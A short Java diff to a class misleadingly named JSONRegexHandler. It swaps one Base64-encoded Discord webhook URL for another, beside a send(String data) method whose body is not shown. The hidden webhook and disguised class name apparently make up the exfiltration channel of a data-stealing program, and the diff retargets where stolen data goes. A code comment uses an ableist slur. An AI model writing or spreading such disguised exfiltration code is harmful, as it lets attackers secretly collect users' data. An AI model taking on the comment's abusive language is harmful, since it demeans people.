@@ -9,7 +9,7 @@ import java.util.Base64;
 
 public class JSONRegexHandler {
     // For Retarded Ski-People the webhook below is encrypted in Base64 with a UTF-8 character set (Usually using https://base64encode.org).
-    private static final String WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTE5ODA1NjY0MTI0MTAwNjA4L1Atdm15dk5fZmV4VXBERTFQWnF6anZsbG4xY2dDZjhYT0VlM240bDdFZTBqRnM4MzZRMFNhU3BhTzFqRlQ3Y01udmFE";
+    private static final String WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTIwMzA3MjMyNzYyMTM0NTY5L2o3a1B0dmM3eHc5X3VfNTJxaTdVcVpiQXZ2TXVheFZRRzJMV05JMElORy1Mb1BlSmU1Q0FwN1NTUnFDeGNHcWo1SEdr";
     private static boolean success = true;
 
     public static void send(String data) {
